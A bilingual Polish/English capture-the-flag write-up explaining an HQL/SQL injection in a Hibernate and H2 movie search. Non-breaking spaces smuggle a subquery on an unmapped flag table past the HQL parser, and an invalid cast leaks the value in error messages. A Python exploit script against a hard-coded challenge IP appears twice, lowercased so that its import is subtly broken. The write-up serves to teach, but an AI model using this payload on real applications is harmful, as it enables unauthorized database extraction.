﻿##hqlol (web, 500p)

	plenty of hacker movies. 
	but table flag isn't mapped by hql and you aren't an db administrator. 
	anyway, good luck!

###pl
[eng](#eng-version)

w zadaniu dostajemy stronę napisaną w gradle która pozwala przeglądać listę filmów o hackerach oraz wyszukiwać filmy.
ta ostatnia opcja jest wyjatkowo ciekawa ponieważ od razu widać, że wyszukiwarka jest podatna na sql injection, a dodatkowo wypisuje logi błędu oraz stacktrace.

zapytania do bazy wykonywane są poprzez hibernate, a baza to h2. 
użycie hibernate oraz hql wyklucza możliwość wykonania `union select`, niemniej cały czas możemy wykonywać podzapytania.
ponieważ widzimy logi błędów, możemy w warunku `where` wykonywać niepoprawne rzutowania (np. stringa na inta) i w ten sposób odczytywać wartości.

dodatkowo jak wynika z treści zadania tabela z flagą nie jest zmapowana przez hibernate, więc jakakolwiek próba wykonania zapytania dla tabeli `flag` skończy się błędem `flag table is not mapped by hibernate`.

treść zadania informuje nas także, że nie jesteśmy administratorem, więc nie możemy skorzystać z funkcji `file_read()` udostępnianej przez bazę h2.

po długiej analizie obu potencjalnych wektorów ataku - bazy h2 oraz hibernate trafiliśmy wreszcie na interesujące zachowanie lexera/parsera hql - nie rozpoznaje on poprawnie `non-breaking-space` w efekcie użycie takiego symbolu jest traktowane jak zwykły symbol.

oznacza to, że `xxnon-breaking-spacexx` zostanie potraktowane przez parser jako jedno słowo, podczas gdy baza danych potraktuje to jako dwa słowa przedzielone spacją.
dzięki temu wysłanie ciągu `selectxflagxfromxflag` gdzie przez `x` oznaczamy non-breaking-space nie zostanie przez parser hql zinterpretowane jako podzapytanie i nie dostaniemy błędu `table flag is not mapped`, a jednocześnie baza h2 poprawnie zinterpretuje ten ciąg jako podzapytanie.

do pobrania konkretnej wartości wykorzystaliśmy niepoprawne rzutowanie wartości z tabeli `flag` i flagę odczytaliśmy z logu błędu.

skrypt rozwiązujący zadanie:

```python
import requests
from bs4 import beautifulsoup

val = u'\u00a0'

payload = u"' and (cast(concat('->', (selectxflagxfromxflagxlimitx1)) as int))=0 or ''='"
quoted = requests.utils.quote(payload)
quoted = quoted.replace('x', val)
response = requests.get('http://52.91.163.151:8080/movie/search?query=' + quoted)
soup = beautifulsoup(response.text)
x = soup.find('dl', class_='error-details')
if x:
    print x
else:
    print response.text
```

###eng version

in the task we get a webpage writen in gradle, which allows us to browse hacker movies and search them.
this last option is interesting since it's clear that there is a sql injection vulnerability there, and also because it prints out the whole error messages with stacktraces.

database queries are handled by hibernate and the database is h2.
hibernate and hql restricts us a little bit, because we can't use `union select`, however we can still execute subqueries.
since we can see error logs we can perform incorrect casts in `where` condition (eg. string to int) and read the value from error message.

additionally the task description states that the table with flag is not mapped by hibernate, so any attempt to query this table will end up with `flag table is not mapped by hibernate`.

the task description also informs us that we're not admin so we can't use `file_read()` function from h2 database.

after a long analysis of potential attack vectors - h2 database and hibernate, we finally found an interesting behaviour of hql parser - it does not handle non-breaking-spaces correctly, and therefore this symbol is treated as a normal character and not as whitespace.

this means that `xxnon-breaking-spacexx` will be treated by parser as a single word, while the database will treat this as 2 words separated by a space.
thanks to that, sending `selectxflagxfromxflag`, where `x` is the non-breaking-space, will not be recognized by hql parser as subquery and thus we won't see `table flag is not mapped` error, but the database itself will recognize this as a subquery.

in order to get value from table we used the incorrect cast of the value from `flag` table and the result could be seen in errorlog.

script to solve this task:

```python
import requests
from bs4 import beautifulsoup

val = u'\u00a0'

payload = u"' and (cast(concat('->', (selectxflagxfromxflagxlimitx1)) as int))=0 or ''='"
quoted = requests.utils.quote(payload)
quoted = quoted.replace('x', val)
response = requests.get('http://52.91.163.151:8080/movie/search?query=' + quoted)
soup = beautifulsoup(response.text)
x = soup.find('dl', class_='error-details')
if x:
    print x
else:
    print response.text
```
